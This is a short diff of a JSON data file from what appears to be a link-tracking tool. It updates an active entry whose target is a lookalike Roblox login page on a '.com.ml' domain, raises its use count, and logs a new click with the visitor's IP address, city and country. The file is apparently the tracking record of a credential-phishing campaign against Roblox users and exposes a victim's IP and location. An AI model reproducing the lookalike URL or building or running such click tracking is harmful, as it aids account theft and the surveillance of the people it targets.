@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 253,
+    "useCount": 254,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2136,6 +2136,14 @@
         "city": "Detroit",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1776997169277,
+        "ip": "45.170.225.37",
+        "country": "Nicaragua",
+        "city": "Managua",
+        "flag": "🇳🇮",
+        "countryCode": "NI"
       }
     ]
   },
